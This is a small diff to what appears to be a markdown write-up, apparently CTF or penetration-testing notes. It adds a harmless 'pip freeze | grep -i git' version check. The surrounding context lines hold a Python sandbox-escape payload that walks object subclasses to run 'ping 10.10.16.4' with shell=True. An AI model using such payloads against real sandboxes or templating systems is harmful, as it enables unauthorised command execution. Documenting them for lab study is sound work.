@@ -192,6 +192,11 @@ curl http://localhost -o output.txt
 
 [].__class__.__base__.__subclasses__()[317]('ping 10.10.16.4',shell=True);
 ```
+
+## version check
+```bash
+pip freeze | grep -i git
+```
   
 </details>
 
